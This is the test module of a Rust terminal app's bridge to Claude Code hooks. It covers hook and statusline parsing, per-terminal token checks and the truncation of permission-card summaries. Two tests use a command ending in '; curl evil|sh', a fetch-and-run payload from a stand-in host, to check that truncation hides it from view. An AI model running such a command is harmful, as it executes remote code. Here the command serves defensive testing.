        .is_some_and(|t| now.duration_since(t) >= BUSY_STALE_AFTER);
    if stale || process_gone {
        state.reset_not_running();
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn t0() -> Instant {
        Instant::now()
    }

    #[test]
    fn plugin_dir_layout() {
        let tmp = tempfile::tempdir().expect("tmp");
        let cli = Path::new(r"C:\Program Files\RTerm\rterm-cli.exe");
        let args = write_plugin_dir(tmp.path(), cli, true).expect("write");
        let root = PathBuf::from(&args.plugin_dir);
        let plugin: Value = serde_json::from_str(
            &std::fs::read_to_string(root.join(".claude-plugin/plugin.json")).expect("plugin.json"),
        )
        .expect("json");
        assert_eq!(plugin["name"], "rterm-bridge");
        let hooks: Value = serde_json::from_str(
            &std::fs::read_to_string(root.join("hooks/hooks.json")).expect("hooks.json"),
        )
        .expect("json");
        for ev in HOOK_EVENTS {
            let cmd = hooks["hooks"][ev][0]["hooks"][0]["command"]
                .as_str()
                .unwrap_or("");
            assert_eq!(cmd, "\"C:/Program Files/RTerm/rterm-cli.exe\" hook", "{ev}");
            assert_eq!(hooks["hooks"][ev][0]["hooks"][0]["type"], "command");
        }
        let sf = args.settings_file.expect("settings");
        let s: Value =
            serde_json::from_str(&std::fs::read_to_string(&sf).expect("settings")).expect("json");
        assert_eq!(s["statusLine"]["type"], "command");
        assert_eq!(
            s["statusLine"]["command"],
            "\"C:/Program Files/RTerm/rterm-cli.exe\" hook --statusline"
        );
        // 关闭状态栏注入
        let args = write_plugin_dir(tmp.path(), cli, false).expect("write");
        assert!(args.settings_file.is_none());
    }

    #[test]
    fn user_statusline_lookup_order() {
        let tmp = tempfile::tempdir().expect("tmp");
        let home = tmp.path().join("home");
        let proj = tmp.path().join("proj");
        std::fs::create_dir_all(home.join(".claude")).expect("mk");
        std::fs::create_dir_all(proj.join(".claude")).expect("mk");
        assert_eq!(find_user_statusline(&proj, &home), None);
        std::fs::write(
            home.join(".claude/settings.json"),
            r#"{"statusLine":{"type":"command","command":"home-cmd"}}"#,
        )
        .expect("w");
        assert_eq!(
            find_user_statusline(&proj, &home).as_deref(),
            Some("home-cmd")
        );
        std::fs::write(
            proj.join(".claude/settings.json"),
            r#"{"statusLine":{"command":"proj-cmd"}}"#,
        )
        .expect("w");
        assert_eq!(
            find_user_statusline(&proj, &home).as_deref(),
            Some("proj-cmd")
        );
        std::fs::write(
            proj.join(".claude/settings.local.json"),
            r#"{"statusLine":{"command":"local-cmd"}}"#,
        )
        .expect("w");
        assert_eq!(
            find_user_statusline(&proj, &home).as_deref(),
            Some("local-cmd")
        );
    }

    #[test]
    fn message_parsing() {
        let m = parse_message(br#"{"term_id":"T1","kind":"hook","payload":{"a":1}}"#).expect("ok");
        assert_eq!(m.term_id, "T1");
        assert_eq!(m.payload["a"], 1);
        assert!(parse_message(br#"{"term_id":"","kind":"hook","payload":null}"#).is_none());
        assert!(parse_message(br#"{"term_id":"T","kind":"other","payload":null}"#).is_none());
        assert!(parse_message(b"garbage").is_none());
        let big = vec![b'a'; MAX_MESSAGE_BYTES + 1];
        assert!(parse_message(&big).is_none());
        // payload 为 null 也接受
        assert!(parse_message(br#"{"term_id":"T","kind":"statusline","payload":null}"#).is_some());
    }

    fn msg_with(term: &str, token: Option<&str>, kind: &str) -> Vec<u8> {
        build_message(
            term,
            token,
            kind == "statusline",
            "{\"hook_event_name\":\"Stop\"}",
        )
        .into_bytes()
    }

    async fn send(ep: &str, data: Vec<u8>) -> bool {
        let ep = ep.to_string();
        tokio::task::spawn_blocking(move || send_to_endpoint(&ep, &data, Duration::from_secs(2)))
            .await
            .expect("join")
    }

    async fn recv_one(rx: &mut mpsc::Receiver<BridgeMessage>) -> Option<BridgeMessage> {
        tokio::time::timeout(Duration::from_millis(400), rx.recv())
            .await
            .ok()
            .flatten()
    }

    #[tokio::test]
    async fn ipc_roundtrip_and_two_terms() {
        let tmp = tempfile::tempdir().expect("tmp");
        let (server, mut rx) = BridgeServer::start(tmp.path()).expect("start");
        let ep = server.endpoint().to_string();
        let ta = server.tokens().issue("A");
        let tb = server.tokens().issue("B");
        assert!(send(&ep, msg_with("A", Some(&ta), "hook")).await);
        assert!(send(&ep, msg_with("B", Some(&tb), "statusline")).await);
        let mut ids = Vec::new();
        for _ in 0..2 {
            let m = tokio::time::timeout(Duration::from_secs(3), rx.recv())
                .await
                .expect("超时")
                .expect("closed");
            ids.push(m.term_id);
        }
        ids.sort();
        assert_eq!(ids, vec!["A", "B"]);
        // 垃圾数据被忽略，不影响后续
        assert!(send(&ep, b"not json\n".to_vec()).await);
        assert!(recv_one(&mut rx).await.is_none());
    }

    /// 审查 M5：没有令牌或令牌不对的事件一律丢弃。
    #[tokio::test]
    async fn ipc_drops_events_without_a_valid_token() {
        let tmp = tempfile::tempdir().expect("tmp");
        let (server, mut rx) = BridgeServer::start(tmp.path()).expect("start");
        let ep = server.endpoint().to_string();
        let ta = server.tokens().issue("A");
        let tb = server.tokens().issue("B");
        // 没有 token 字段
        assert!(send(&ep, msg_with("A", None, "hook")).await);
        assert!(recv_one(&mut rx).await.is_none(), "无令牌的事件应被丢弃");
        // 令牌错误（同长度）
        let wrong = "0".repeat(32);
        assert!(send(&ep, msg_with("A", Some(&wrong), "hook")).await);
        assert!(recv_one(&mut rx).await.is_none());
        // 别的终端的令牌
        assert!(send(&ep, msg_with("A", Some(&tb), "hook")).await);
        assert!(recv_one(&mut rx).await.is_none());
        // 长度不对 / 不是十六进制
        for bad in ["", "abc", "zz", &ta[..31], &format!("{ta}0")] {
            assert!(send(&ep, msg_with("A", Some(bad), "hook")).await);
            assert!(recv_one(&mut rx).await.is_none(), "令牌 {bad:?} 应被拒绝");
        }
        // 没登记过的终端
        assert!(send(&ep, msg_with("NOPE", Some(&ta), "hook")).await);
        assert!(recv_one(&mut rx).await.is_none());
        // 正确的令牌通过；撤销后失效
        assert!(send(&ep, msg_with("A", Some(&ta), "hook")).await);
        assert_eq!(recv_one(&mut rx).await.map(|m| m.term_id), Some("A".into()));
        server.tokens().revoke("A");
        assert!(send(&ep, msg_with("A", Some(&ta), "hook")).await);
        assert!(recv_one(&mut rx).await.is_none(), "终端关闭后令牌应失效");
    }

    #[test]
    fn tokens_are_128_bit_random_and_compared_strictly() {
        let t = TermTokens::default();
        let a = t.issue("T1");
        let b = t.issue("T2");
        assert_eq!(a.len(), 32);
        assert!(a.bytes().all(|c| c.is_ascii_hexdigit()));
        assert_ne!(a, b);
        assert!(t.verify("T1", Some(&a)));
        assert!(
            t.verify("T1", Some(&a.to_uppercase())),
            "十六进制不区分大小写"
        );
        assert!(!t.verify("T1", Some(&b)));
        assert!(!t.verify("T1", None));
        assert!(!t.verify("T1", Some("")));
        assert!(!t.verify("T9", Some(&a)));
        // 重新签发会让旧令牌失效
        let a2 = t.issue("T1");
        assert!(!t.verify("T1", Some(&a)));
        assert!(t.verify("T1", Some(&a2)));
        assert!(ct_eq(&[1, 2, 3], &[1, 2, 3]));
        assert!(!ct_eq(&[1, 2, 3], &[1, 2, 4]));
        assert!(!ct_eq(&[1, 2, 3], &[1, 2]));
    }

    #[test]
    fn rejected_events_are_logged_once_per_term() {
        let t = TermTokens::default();
        assert!(t.note_rejected("T1"), "第一次应记录");
        assert!(!t.note_rejected("T1"), "同一终端不重复记录");
        assert!(t.note_rejected("T2"));
        // 记录表有上限，不会被无限撑大
        for i in 0..1000 {
            let _ = t.note_rejected(&format!("X{i}"));
        }
        assert!(t.rejected_len() <= 256);
    }

    #[test]
    fn hook_message_carries_the_token() {
        let m = build_message("T1", Some("abcd"), false, "{\"a\":1}");
        let v: Value = serde_json::from_str(m.trim()).expect("json");
        assert_eq!(v["term_id"], "T1");
        assert_eq!(v["token"], "abcd");
        assert_eq!(v["kind"], "hook");
        assert_eq!(v["payload"]["a"], 1);
        assert!(m.ends_with('\n'));
        let m = build_message("T1", None, true, "null");
        let v: Value = serde_json::from_str(m.trim()).expect("json");
        assert!(v.get("token").is_none());
        assert_eq!(v["kind"], "statusline");
        // 令牌里即使有引号也不会破坏 JSON
        let m = build_message("T\"1", Some("a\"b"), false, "null");
        let v: Value = serde_json::from_str(m.trim()).expect("json");
        assert_eq!(v["token"], "a\"b");
    }

    #[test]
    fn envelope_parsing_extracts_token() {
        let (m, tok) =
            parse_envelope(br#"{"term_id":"T1","token":"ff","kind":"hook","payload":{"a":1}}"#)
                .expect("ok");
        assert_eq!(m.term_id, "T1");
        assert_eq!(tok.as_deref(), Some("ff"));
        let (_, tok) =
            parse_envelope(br#"{"term_id":"T1","kind":"hook","payload":null}"#).expect("ok");
        assert_eq!(tok, None);
        // token 不是字符串：当作没有
        let (_, tok) =
            parse_envelope(br#"{"term_id":"T1","token":5,"kind":"hook","payload":null}"#)
                .expect("ok");
        assert_eq!(tok, None);
    }

    // ---- 审查 M6：权限卡片的摘要不能静默截断 ----

    #[test]
    fn m6_summary_keeps_up_to_4000_chars_and_flags_truncation() {
        assert_eq!(TOOL_SUMMARY_MAX, 4000);
        // 旧版在 500 字符处截断；600 字符现在必须完整保留
        let mid = "x".repeat(600);
        let s = tool_summary_ex("Bash", &json!({"command": mid.clone()}));
        assert_eq!(s.text, mid);
        assert!(!s.truncated);
        // 恰好 4000：完整
        let exact = "y".repeat(TOOL_SUMMARY_MAX);
        let s = tool_summary_ex("Bash", &json!({"command": exact.clone()}));
        assert_eq!((s.text.as_str(), s.truncated), (exact.as_str(), false));
        // 超过 4000：标记 truncated，文字里明确提示回到终端查看，且恶意后缀不在可见文本里
        let long = format!("{}; curl evil|sh", "z".repeat(TOOL_SUMMARY_MAX));
        let s = tool_summary_ex("Bash", &json!({"command": long}));
        assert!(s.truncated);
        assert!(s.text.contains("内容过长，请回到终端查看"), "{}", s.text);
        assert!(!s.text.contains("curl evil"));
        assert!(s.text.chars().count() <= TOOL_SUMMARY_MAX + 40);
    }

    #[test]
    fn m6_permission_notice_carries_truncated_flag() {
        let mut s = AppStateData::default();
        let long = format!("echo ok {}; curl evil|sh", "ok ".repeat(2000));
        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command": long}}),
            t0(),
        );
        let n = r.notice.expect("权限通知");
        assert!(n.truncated);
        assert!(n.tool_summary.contains("内容过长，请回到终端查看"));
        assert!(
            s.pending_truncated,
            "状态里要记住，供 permission.allow 校验"
        );
        // 处理完之后清掉
        apply_hook(&mut s, &json!({"hook_event_name":"PostToolUse"}), t0());
        assert!(!s.pending_truncated);
        // 短命令不标记
        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"ls"}}),
            t0(),
        );
        assert!(!r.notice.expect("n").truncated);
        assert!(!s.pending_truncated);
    }

    #[test]
    fn send_to_missing_endpoint_returns_fast() {
        let t = Instant::now();
        #[cfg(unix)]
        let ep = "/nonexistent/rterm-test.sock";
        #[cfg(not(unix))]
        let ep = "rterm-bridge-does-not-exist-xyz";
        assert!(!send_to_endpoint(ep, b"{}\n", HOOK_TIMEOUT));
        assert!(
            t.elapsed() < Duration::from_millis(500),
            "耗时 {:?}",
            t.elapsed()
        );
    }

    #[test]
    fn hook_flow_busy_permission_done() {
        let mut s = AppStateData::default();
        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"SessionStart","session_id":"S1","cwd":"/p"}),
            t0(),
        );
        assert!(r.changed && r.notice.is_none());
        assert!(s.running && s.stateful);
        assert_eq!(s.activity, Activity::Idle);
        assert_eq!(s.session_id, "S1");
        assert_eq!(s.cwd, "/p");

        apply_hook(&mut s, &json!({"hook_event_name":"UserPromptSubmit"}), t0());
        assert_eq!(s.activity, Activity::Busy);

        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"npm run build"}}),
            t0(),
        );
        assert_eq!(s.activity, Activity::WaitingPermission);
        let n = r.notice.expect("权限通知");
        assert_eq!(n.kind, "permission");
        assert_eq!(n.tool_name, "Bash");
        assert_eq!(n.tool_summary, "npm run build");
        assert!(n.notice_id > 0 && !n.resolved);
        assert_eq!(s.pending_notice, Some(n.notice_id));

        let r = apply_hook(&mut s, &json!({"hook_event_name":"PostToolUse"}), t0());
        let n2 = r.notice.expect("撤掉卡片");
        assert!(n2.resolved && n2.notice_id == n.notice_id);
        assert_eq!(s.activity, Activity::Busy);
        assert_eq!(s.pending_notice, None);

        let r = apply_hook(&mut s, &json!({"hook_event_name":"Stop"}), t0());
        assert_eq!(r.notice.map(|n| n.kind), Some("done".into()));
        assert_eq!(s.activity, Activity::Idle);

        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"StopFailure","error":"rate_limit"}),
            t0(),
        );
        let n = r.notice.expect("error");
        assert_eq!((n.kind.as_str(), n.text.as_str()), ("error", "rate_limit"));

        apply_hook(&mut s, &json!({"hook_event_name":"SessionEnd"}), t0());
        assert!(!s.running && !s.stateful);
        assert_eq!(s.to_pb().app, "");
    }

    #[test]
    fn notification_filter_and_model_switch() {
        let mut s = AppStateData::default();
        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"Notification","notification_type":"permission_prompt","message":"x"}),
            t0(),
        );
        assert!(r.notice.is_none());
        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"Notification","notification_type":"idle_prompt","message":"waiting"}),
            t0(),
        );
        let n = r.notice.expect("need_input");
        assert_eq!(
            (n.kind.as_str(), n.text.as_str()),
            ("need_input", "waiting")
        );
        apply_hook(
            &mut s,
            &json!({"hook_event_name":"PostModelSwitch","model":{"id":"claude-opus-4","display_name":"Opus 4"}}),
            t0(),
        );
        assert_eq!(
            (s.model.as_str(), s.model_id.as_str()),
            ("Opus 4", "claude-opus-4")
        );
        let r = apply_hook(
            &mut s,
            &json!({"hook_event_name":"CwdChanged","cwd":"/new"}),
            t0(),
        );
        assert!(r.cwd_changed);
        assert_eq!(s.cwd, "/new");
        // 没有事件名：忽略
        let before = s.clone();
        assert_eq!(
            apply_hook(&mut s, &json!({"x":1}), t0()),
            Applied::default()
        );
        assert_eq!(s, before);
    }

    #[test]
    fn tool_summary_picks_fields() {
        assert_eq!(
            tool_summary("Edit", &json!({"file_path":"/a/b.rs","old_string":"zz"})),
            "/a/b.rs"
        );
        assert_eq!(tool_summary("Weird", &json!({"a":1})), "{\"a\":1}");
        assert_eq!(tool_summary("Bash", &Value::Null), "");
        let long = "x".repeat(TOOL_SUMMARY_MAX + 100);
        assert!(tool_summary("Bash", &json!({"command": long})).contains("内容过长"));
    }

    #[test]
    fn statusline_fields() {
        let mut s = AppStateData::default();
        let v = json!({
            "model": {"id": "claude-opus-4", "display_name": "Opus 4"},
            "context_window": {"used_percentage": 42.4},
            "effort": {"level": "high"},
            "version": "2.1.322",
            "cost": {"total_cost_usd": 0.5},
            "session_name": "work",
            "workspace": {"current_dir": "/proj"}
        });
        let r = apply_statusline(&mut s, &v, t0());
        assert!(r.changed);
        let p = s.to_pb();
        assert_eq!(p.model, "Opus 4");
        assert_eq!(p.context_used_pct, 42);
        assert!(p.has_context && p.stateful && p.running);
        assert_eq!(
            (
                p.effort.as_str(),
                p.version.as_str(),
                p.session_name.as_str(),
                p.cwd.as_str()
            ),
            ("high", "2.1.322", "work", "/proj")
        );
        assert_eq!(p.cost_usd, 0.5);
        // 同样的数据再来一次：没有变化
        assert!(!apply_statusline(&mut s, &v, t0()).changed);
    }

    #[test]
    fn stale_busy_resets() {
        let mut s = AppStateData::default();
        let t = t0();
        apply_hook(&mut s, &json!({"hook_event_name":"UserPromptSubmit"}), t);
        assert!(!reset_if_stale(&mut s, t + Duration::from_secs(60), false));
        assert!(reset_if_stale(
            &mut s,
            t + BUSY_STALE_AFTER + Duration::from_secs(1),
            false
        ));
        assert!(!s.running);
        apply_hook(&mut s, &json!({"hook_event_name":"UserPromptSubmit"}), t);
        assert!(reset_if_stale(&mut s, t, true), "进程已不存在时应重置");
        // 空闲状态不重置
        apply_hook(&mut s, &json!({"hook_event_name":"SessionStart"}), t);
        assert!(!reset_if_stale(&mut s, t + BUSY_STALE_AFTER * 2, true));
    }

    #[test]
    fn probe_only_without_state() {
        let mut s = AppStateData::default();
        assert!(s.set_running_by_probe(true));
        assert!(s.running && !s.stateful);
        assert!(!s.set_running_by_probe(true));
        assert!(s.set_running_by_probe(false));
        apply_hook(&mut s, &json!({"hook_event_name":"SessionStart"}), t0());
        assert!(
            !s.set_running_by_probe(false),
            "有状态回传时不受进程检测影响"
        );
        assert!(s.running);
    }
}
